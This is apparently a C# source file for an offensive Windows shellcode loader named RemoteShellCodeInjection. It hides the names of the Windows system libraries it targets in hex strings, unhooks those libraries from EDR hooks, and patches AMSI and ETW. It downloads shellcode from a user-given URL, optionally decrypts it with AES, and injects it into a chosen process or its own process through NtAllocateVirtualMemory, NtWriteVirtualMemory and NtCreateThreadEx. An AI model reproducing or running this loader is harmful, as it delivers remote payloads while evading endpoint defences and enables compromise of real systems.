using System.Diagnostics;
using System.Globalization;
using System.Runtime.InteropServices;
using System.Text;
namespace RemoteShellCodeInjection
{
    internal class Program
    {
        //6e74646c6c2e646c6c = ntdll.dll
        //kernel32.dll=6b65726e656c33322e646c6c
        //6b65726e656c626173652e646c6c= kernelbase.dll
        //advapi32.dll= 61647661706933322e646c6c
        //NtProtectVirtualMemory = 4e7450726f746563745669727475616c4d656d6f7279
        private const string Format = "X4";
        [DllImport("kernel32.dll")]
        private static extern bool FreeLibrary(IntPtr hModule);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtAllocateVirtualMemory(IntPtr processHandle, ref IntPtr baseAddress, uint zeroBits, ref UIntPtr regionSize, uint allocationType, uint protect);
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtWriteVirtualMemory(IntPtr processHandle, IntPtr baseAddress, byte[] buffer, UIntPtr numberOfBytesToWrite, out UIntPtr numberOfBytesWritten);
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtCreateThreadEx(out IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startRoutine, IntPtr argument, uint createFlags, uint zeroBits, uint stackSize, uint maximumStackSize, IntPtr attributeList);
        [DllImport(dllName: "ntdll.dll", SetLastError = true)]
        private static extern int NtFreeVirtualMemory(IntPtr processHandle, ref IntPtr baseAddress, ref UIntPtr regionSize, uint freeType);
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtClose(IntPtr handle);

        private static void Main(string[] args)
        {
           // Task.Factory.StartNew(() => CheckModule());
            bool aes = args.Contains("-aes");
            string url = "";
            string key = "";
            string pname = "";
            bool selfinject = false;
            byte[] assemblyBytes;
            string shellString;
            Process? targetProcess;
            IntPtr hProc = IntPtr.Zero;
            byte[] Key;
            byte[] IV;
            string[] ListOfDLLToUnhook = { Utils.Utils.FromHexString("6e74646c6c2e646c6c"), Utils.Utils.FromHexString("6b65726e656c33322e646c6c"),
                Utils.Utils.FromHexString("6b65726e656c626173652e646c6c"), Utils.Utils.FromHexString("61647661706933322e646c6c") };
            for (int i = 0; i < ListOfDLLToUnhook.Length; i++)
            {
                SharpUnhooker.JMPUnhooker(ListOfDLLToUnhook[i]);
                SharpUnhooker.EATUnhooker(ListOfDLLToUnhook[i]);
                if (ListOfDLLToUnhook[i] != Utils.Utils.FromHexString("6e74646c6c2e646c6c"))
                {
                    SharpUnhooker.IATUnhooker(ListOfDLLToUnhook[i]);
                }
            }
            for (int i = 0; i < args.Length; i++)
            {
                switch (args[i])
                {
                    case "-url":
                        url = args[i + 1];
                        break;
                    case "-key":
                        key = args[i + 1];
                        break;
                    case "-pname":
                        pname = args[i + 1];
                        break;
                    case "-selfinject":
                        selfinject = true;
                        break;
                }
            }
            // Validate the arguments
            if (string.IsNullOrEmpty(url))
            {
                Console.WriteLine("[-] Error: URL is required.");
                return;
            }
            if (aes && string.IsNullOrEmpty(key))
            {
                Console.WriteLine("[-] Error: Key is required when AES  is specified.");
                return;
            }
            if (!string.IsNullOrEmpty(pname) && selfinject)
            {
                Console.WriteLine("[-] Error: Only one of pname or selfinject can be specified.");
                return;
            }
            if (!string.IsNullOrEmpty(pname))
            {
                Console.WriteLine("[*] Process name: " + pname);
                // Get the process handle for the target process
                targetProcess = Process.GetProcessesByName(pname)?.FirstOrDefault();
                if (targetProcess != null)
                {
                    hProc = targetProcess.Handle;
                    Console.WriteLine("[*] Process handle: " + hProc);
               
                }
                else
                {
                    ConsoleKey response;
                    do
                    {
                        Console.WriteLine("[*] Process: " + pname + " Not found. Do you want to inject in the current process? [y/n]");
                        response = Console.ReadKey(false).Key;
                        if (response != ConsoleKey.Enter)
                        {
                            Console.WriteLine();
                        }
                    } while (response != ConsoleKey.Y && response != ConsoleKey.N);
                    if (response == ConsoleKey.Y)
                    {
                        selfinject = true;
                    }
                    else
                    {
                        Console.WriteLine("[-] Aborting...");
                        return;
                    }

                }
            }
            if (!selfinject && string.IsNullOrEmpty(pname))
            {
                Console.WriteLine("[-] Aborting: You have specified neither the process to use to inject the shellcode nor  -selfinject argument.");
                return;
            }
            if (selfinject)
            {
                targetProcess = Process.GetCurrentProcess();
                hProc = targetProcess.Handle;
                Console.WriteLine("[*] Self-inject: Using the handle " + hProc);
            }
            try
            {
                Console.WriteLine("[*] Downloading: " + url);
                // Download the remote shellcode
                HttpClient client = new();
                shellString = client.GetStringAsync(url).Result;
                assemblyBytes = CleanSC(shellString).Split(',').Select(s => byte.Parse(s[2..], NumberStyles.HexNumber)).ToArray();
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Aborting: Check that there are no trailing linebreaks on your shellcode " + ex.Message);
                return;
            }
            if (aes)
            {
                Console.WriteLine("[*] Decrypting the shellcode using KEY/IV: " + key);
                Key = Convert.FromBase64String(key);
                IV = Convert.FromBase64String(key);
                try
                {
                    byte[] ClearedAssemblyBytes = Utils.Utils.AESDecrypt(assemblyBytes, Key, IV);
                    StringBuilder hex = new StringBuilder(ClearedAssemblyBytes.Length * 2);
                    foreach (byte b in ClearedAssemblyBytes)
                    {
                        hex.AppendFormat("0x{0:x2},", b);
                    }
                    assemblyBytes = ClearedAssemblyBytes;
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[-] Aborting: " + ex.Message);
                }
            }
            PatchAMSIAndETW.Run();
            Inject(hProc, assemblyBytes);
        }
        static void UnloadModule(string moduleName)
        {
            Process process = Process.GetCurrentProcess();
            ProcessModule? module = process.Modules.Cast<ProcessModule>()
                .FirstOrDefault(m => m.ModuleName == moduleName);
            if (module != null)
            {
                // Unload the module
                FreeLibrary(module.BaseAddress);
                Console.WriteLine($"{moduleName} module was successfully unloaded.");
            }
            else
            {
                Console.WriteLine($"{moduleName} module was not found.");
            }
        }
        private static string CleanSC(string shellString)
        {
            shellString = shellString.Trim().Replace("\n", string.Empty).Replace("\t", string.Empty).Replace("\r", string.Empty).Replace(" ", string.Empty);
            if (shellString[^1]==',')
            {
                shellString = shellString[0..^1];
            }
            return shellString;
        }

        private static void Inject(IntPtr hProc, byte[] assemblyBytes)
        {
            // Allocate memory in the target process for the remote assembly
            IntPtr remoteAssembly = IntPtr.Zero;
            UIntPtr remoteAssemblySize = (UIntPtr)1024;
            Console.WriteLine("[*] Allocating memory...");
            NtAllocateVirtualMemory(hProc, ref remoteAssembly, 0, ref remoteAssemblySize, 0x1000, 0x40);
            Console.WriteLine("[*] Copying Shellcode...");
            // Write the remote assembly to the allocated memory in the target process
            NtWriteVirtualMemory(hProc, remoteAssembly, assemblyBytes, (UIntPtr)assemblyBytes.Length, out _);
            Console.WriteLine("[*] Creating new thread to execute the Shellcode...");
            // Create a remote thread in the target process to execute the remote assembly
            NtCreateThreadEx(out IntPtr hThread, 0x1FFFFF, IntPtr.Zero, hProc, remoteAssembly, IntPtr.Zero, 0, 0, 0, 0, IntPtr.Zero);
            Console.WriteLine("[+] Thread created with handle {0} Shellcode executed.", hThread.ToString(Format));
            Console.WriteLine("\n[+] Press Enter to clean the mess.", hThread.ToString(Format));
            _ = Console.Read();
            // Wait for the remote thread to finish execution
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            Console.WriteLine($"[+] Cleaning thread {hThread.ToString(Format)} from the process {hProc}");
            NtFreeVirtualMemory(hProc, ref remoteAssembly, ref remoteAssemblySize, 0x8000);
            NtClose(hThread);
        }
    }
}

